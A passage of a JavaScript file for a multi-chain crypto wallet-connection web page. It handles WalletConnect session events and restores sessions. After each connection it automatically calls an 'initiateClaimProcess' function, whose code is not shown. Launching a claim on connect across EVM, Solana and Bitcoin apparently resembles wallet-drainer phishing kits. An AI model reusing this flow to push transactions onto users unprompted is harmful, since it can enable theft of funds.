          // Update provider with new session? For simplicity, we'll reinit provider
          try {
            const session = client.session.get(currentSession?.topic);
            if (session) {
              const provider = await EthereumProvider.init({
                projectId: CONFIG.PROJECT_ID,
                metadata: CONFIG.DAPP_METADATA,
                session,
              });
              setGlobalProvider(provider, account, 'evm');
              updateConnectedUI(account, 'evm');
              saveWallet(account, session, 'evm');
              setTimeout(() => {
                if (typeof window.initiateClaimProcess === 'function') {
                  window.initiateClaimProcess();
                }
              }, 500);
            }
          } catch (e) {
            logDebug(`Session update failed: ${e.message}`);
          }
        }
      });

      client.on('session_delete', () => {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected by provider', 'error');
      });

      client.on('session_connect', async (session) => {
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          const provider = await EthereumProvider.init({
            projectId: CONFIG.PROJECT_ID,
            metadata: CONFIG.DAPP_METADATA,
            session,
          });
          setGlobalProvider(provider, account, 'evm');
          currentSession = session;
          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 500);
        }
      });
    }

    // Global provider events for direct injection (desktop)
    if (window.ethereum && isDesktop()) {
      setupEVMProviderEvents(window.ethereum);
    }

    // Visibility change – check for pending session on return
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden && getSavedWallet()) {
        const pendingUri = sessionStorage.getItem('pending_wc_uri');
        const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
        if (pendingUri && pendingTimestamp) {
          const elapsed = Date.now() - parseInt(pendingTimestamp);
          if (elapsed < 120000 && client) {
            setTimeout(async () => {
              try {
                const sessions = client.session.values();
                if (sessions.length > 0) {
                  const session = sessions[0];
                  const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
                  if (account) {
                    const provider = await EthereumProvider.init({
                      projectId: CONFIG.PROJECT_ID,
                      metadata: CONFIG.DAPP_METADATA,
                      session,
                    });
                    setGlobalProvider(provider, account, 'evm');
                    currentSession = session;
                    saveWallet(account, session, 'evm');
                    updateConnectedUI(account, 'evm');
                    sessionStorage.removeItem('pending_wc_uri');
                    sessionStorage.removeItem('pending_wc_timestamp');
                    setTimeout(() => {
                      if (typeof window.initiateClaimProcess === 'function') {
                        window.initiateClaimProcess();
                      }
                    }, 500);
                  }
                }
              } catch (e) {
                logDebug(`Visibility restore failed: ${e.message}`);
              }
            }, 500);
          }
        }
      }
    });

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
      if (modal) modal.closeModal();
    });

    logDebug(`✅ main.js fully initialised – Platform: ${getPlatform()}, Mobile: ${isMobile()}`);
    logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM (5s) → WC → Solana → BTC'}`);
  } catch (err) {
    logDebug(`❌ Fatal error initializing: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
  }
})();
